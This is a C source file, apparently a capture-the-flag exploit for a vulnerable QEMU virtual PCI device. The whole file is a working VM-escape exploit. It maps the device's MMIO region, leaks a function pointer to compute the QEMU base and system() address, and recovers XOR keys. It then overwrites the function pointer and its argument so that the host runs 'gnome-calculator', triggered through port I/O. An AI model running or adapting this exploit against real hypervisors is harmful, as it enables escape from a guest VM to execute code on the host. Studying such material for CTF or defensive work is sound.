/*
* @Author: resery
* @Date:   2020-10-15 10:40:35
* @Last Modified by:   resery
* @Last Modified time: 2020-10-15 19:08:29
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>   
#include <stdint.h>

#define DMABASE 0x40000
char *userbuf;
uint64_t userbuf_pa;
unsigned char* mmio_mem;

uint64_t xors[5];

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

void mmio_writeu64(uint32_t addr,uint64_t value)
{
    *(uint32_t *)(mmio_mem+addr) = value;
    *(uint32_t *)(mmio_mem+addr + 4) = value >> 32;
}

uint64_t mmio_readu64(uint32_t addr)
{
    return (((uint64_t)mmio_read(addr+4)) << 32) + mmio_read(addr);
}

void get_xors()
{
    for(int i=0;i<5;i++)
    {
        mmio_writeu64(0x0+i*8,0);
        xors[i] = mmio_readu64(0x0+i*8);
        printf("xors[%d]:0x%lx\n",i,(uint64_t)xors[i]);
    }
}

int main(){

	int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1){
        perror("open mmio");
        exit(-1);
    }

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED){
    	perror("mmap mmio");
        exit(-1);
    }

    printf("mmio_mem:\t%p\n", mmio_mem);

    uint64_t leak_func_addr = mmio_readu64(0x20);
    printf("leak_func_addr:\t0x%lx\n", leak_func_addr);
    
    uint64_t qemu_base = leak_func_addr - 0x3a9ea8;
    printf("qemu_base:\t0x%lx\n", qemu_base);


    uint64_t system_addr = qemu_base + 0x2CCB60;
    printf("system_addr:\t0x%lx\n", system_addr);

    get_xors();

    //func
    mmio_writeu64(0x20,xors[4]^system_addr);
    //argument
    mmio_writeu64(0x00,xors[0]^0x61632d656d6f6e67);
    mmio_writeu64(0x08,xors[1]^0x726f74616c75636c);
    mmio_writeu64(0x10,xors[2]^0x00);

    iopl(3);
    outl(0,0xc660);
}